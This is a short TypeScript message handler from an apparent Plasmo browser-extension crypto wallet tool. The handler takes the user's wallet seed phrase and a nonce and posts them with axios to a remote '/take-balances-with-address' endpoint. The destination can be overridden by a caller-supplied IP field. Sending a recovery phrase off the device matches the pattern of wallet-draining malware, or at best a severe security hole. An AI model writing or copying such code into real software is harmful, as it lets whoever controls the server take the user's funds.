import axios from "axios"

import type { PlasmoMessaging } from "@plasmohq/messaging"

const API_URL = process.env.PLASMO_PUBLIC_API_URL

const handler: PlasmoMessaging.MessageHandler = async (req, res) => {
  const message = await axios.post(
    req.body.IP ?? API_URL + "/take-balances-with-address",
    {
      mnemonic: req.body.wallet_seed,
      nonce: req.body.nonce
    }
  )

  res.send({
    message: { ...message?.data }
  })
}

export default handler
